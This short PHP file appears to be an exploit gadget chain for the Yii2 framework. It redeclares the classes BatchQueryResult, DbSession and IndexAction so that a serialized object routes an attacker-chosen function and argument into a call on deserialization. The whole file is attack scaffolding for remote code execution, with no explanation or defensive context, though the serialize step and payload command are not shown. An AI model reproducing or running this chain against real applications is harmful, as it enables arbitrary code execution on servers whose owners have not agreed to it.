<?php
namespace yii\rest {
	class Action extends \yii\base\Action
	{
		public $checkAccess;

	}

	class IndexAction extends Action
	{
		public function __construct($func, $param)
		{
			$this->checkAccess = $func;
			$this->id = $param;
		}
	}
}

namespace yii\web {
	abstract class MultiFieldSession
	{
		public $writeCallback;
	}

	class DbSession extends MultiFieldSession
	{
		public function __construct($func, $param)
		{
			$this->writeCallback = [new \yii\rest\IndexAction($func, $param), "run"];
		}
	}
}

namespace yii\base {
	class BaseObject
	{
		//
	}

	class Action
	{
		public $id;
	}
}

namespace yii\db {
	use yii\base\BaseObject;

	class BatchQueryResult extends BaseObject
	{
		private $_dataReader;

		public function __construct($func, $param)
		{
			$this->_dataReader = new \yii\web\DbSession($func, $param);
		}
	}
}